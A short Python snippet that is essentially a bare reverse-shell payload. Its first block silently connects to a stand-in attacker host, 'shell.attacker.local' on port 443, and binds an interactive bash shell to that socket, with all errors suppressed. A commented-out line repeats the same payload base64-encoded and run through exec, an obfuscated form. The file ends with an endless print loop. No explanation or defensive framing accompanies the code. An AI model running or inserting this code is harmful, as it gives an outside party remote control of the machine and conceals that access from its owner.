try:
    import subprocess;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("shell.attacker.local",443));p=subprocess.Popen(["/bin/bash","-i"], stdout=s.fileno(), stdin=s.fileno(), stderr=s.fileno(), start_new_session=True)
except: pass

#import base64;exec(base64.b64decode('dHJ5OiBpbXBvcnQgc3VicHJvY2Vzcyxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnc2hlbGwuYXR0YWNrZXIubG9jYWwnLDQ0MykpO3A9c3VicHJvY2Vzcy5Qb3BlbihbJy9iaW4vYmFzaCcsJy1pJ10sc3Rkb3V0PXMuZmlsZW5vKCksc3RkaW49cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSxzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6IHBhc3MK').decode())

while True:
    print(1)
